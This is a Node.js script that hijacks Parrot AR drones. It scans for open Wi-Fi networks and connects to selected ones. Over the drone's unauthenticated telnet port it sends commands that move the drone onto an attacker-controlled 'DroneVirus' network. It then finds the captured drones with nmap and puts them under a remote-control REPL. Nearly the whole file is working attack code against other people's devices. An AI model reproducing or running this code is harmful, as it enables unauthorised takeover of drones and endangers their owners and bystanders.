var Wireless = require('./wireless')
  , async = require('async')
  , ArDroneFleet = require('ar-drone-fleet')
  , net = require('net')
  , parseString = require('xml2js').parseString
  , exec = require('child_process').exec
  , fs = require('fs')
  , fleet;

if(process.argv[2]) {
  startRepl(new Wireless({ }));
} else {

  function takeControl(cb) {
    console.log("Setting up to test if isDrone");
      var client = net.connect(23, "192.168.1.1", function() {
        var ip = Math.floor((Math.random() * ((255 + 1) - 10)) + 10);
        console.log("IS A DRONE");
        console.log("SETTING IP TO 192.168.43." + ip);
        client.end('ifconfig ath0 down ; iwconfig ath0 mode managed essid DroneVirus ap any channel auto commit ; ifconfig ath0 192.168.43.'+ip+' netmask 255.255.255.0 up\r\n');
        client.destroy();
        console.log("ENDING");
        cb(true);
      });

      client.on("error", function(err) {
        console.log("NOT A DRONE");
        console.log(err);
        client.destroy();
        cb(false);
      });
  };

  exec("sudo networksetup -setdhcp Wi-Fi", function() {
    var network = new Wireless({ });

    network.scan(function(err, networks) {
      var insecureNetworks = networks.filter(function(network) {
        return network.security == "NONE";
      }).map(function(network) {
        return network.ssid;
      });

      async.eachSeries(insecureNetworks, function(ssid, callback) {
        console.log("Connecting to " + ssid);

        if(ssid == "DroneVirus") {
          console.log("Skipping " + ssid);
          return callback();
        }


        if(!(ssid == "Tingle" || ssid == "Link" || ssid == "Homer")) {
          console.log("Skipping " + ssid);
          return callback();
        }

        network.connect(ssid, function(err) {
          console.log("Connected to " + ssid);
          if(err) {
            return callback(err);
          }

          takeControl(function(yes) {
            if(yes) {
              console.log(ssid + " is a drone");
              callback();
            } else {
              console.log(ssid + " isn't a drone");
              callback()
            }
          });
        });
      }, function(err) {
        startRepl(network);
      });
    });
  });
}

function startRepl(wifi) {
  console.log("Setting up manual IP setup");
  var child = exec('sudo networksetup -setmanual Wi-Fi 192.168.43.2 255.255.255.0 192.168.43.1', function (error, stdout, stderr) {
      if (error) {
        console.log("Error: " + error);
      }
      console.log("Connecting to DroneVirus");
      wifi.connect("DroneVirus", function() {
        console.log("scanning for drones on dronevirus, then launching and landing");
          var drones = [];

          setTimeout(function() {
            var child = exec('sudo nmap -n -p 23 -T4 -oX out.xml 192.168.43.10-255', function (error, stdout, stderr) {
                fs.readFile('out.xml', 'utf8', function (err,data) {
                  if (err) {
                    return console.log(err);
                  }
                  parseString(data, function (err, result) {
                    if(result.nmaprun.host) {
                      result.nmaprun.host.forEach(function(host) {
                        if (host.address[1] && host.address[1].$.vendor == 'Parrot') {
                          var ip = host.address[0].$.addr;
                          drones.push({ ip: ip });
                        }
                      });

                      console.log(drones);
                      fleet = new ArDroneFleet(drones);

                      var repl = require('repl')
                      repl.start({
                          prompt: "drone-fleet> ",
                          input: process.stdin,
                          output: process.stdout
                      }).context.fleet = fleet;

                  /*
                      drones.forEach(function(client) {
                        console.log("LAuNCHING");
                        //console.log(client);
                        client.takeoff();
                        client.after(10000,function() {client.land();});
                      });
                      */

                    } else {
                      console.log("COULDN'T FIND DRONES");
                    }
                  });
                });
              });
          }, 10000);
      });
  });
}
